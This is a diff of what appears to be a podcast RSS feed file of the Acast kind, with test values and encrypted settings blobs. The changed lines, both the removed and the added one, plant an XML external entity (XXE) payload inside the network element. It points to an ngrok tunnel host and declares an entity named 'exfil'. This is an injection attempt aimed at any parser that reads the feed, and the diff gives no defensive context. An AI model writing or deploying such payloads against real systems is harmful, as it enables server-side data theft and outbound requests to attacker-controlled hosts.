@@ -20,7 +20,7 @@
 	<acast:showUrl>test</acast:showUrl>
 	<acast:signature key="EXAMPLE" algorithm="aes-256-cbc"><![CDATA[wbG1Z7+6h9QOi+CR1Dv0uQ==]]></acast:signature>
 	<acast:settings><![CDATA[FYjHyZbXWHZ7gmX8Pp1rmStkiTEE0CNxIPxmLPEYNwN8JcQ4bXX8FAQw6qUVW5tXhItbJeDFCms6g/S+7uRWuy149fCgrICmeajbnXORXdWuM1vDpdrpuF9ZxdvdcfCHlCXk+F4W/yvYQ84+R3ZEbw==]]></acast:settings>
-	<acast:network id="0" slug="testn"><<!ENTITY OWO SYSTEM "https://isopentyl-uncarved-chiquita.ngrok-free.dev/test.jpg" >]></acast:network>
+	<acast:network id="0" slug="testn"><!ENTITY % abt "<!ENTITY exfil SYSTEM 'https://isopentyl-uncarved-chiquita.ngrok-free.dev/test.jpg;'>"></acast:network>
 	<itunes:type>episodic</itunes:type>
 		<itunes:image href="https://avatars.githubusercontent.com/u/99093357?v=4"/>
 		<image>
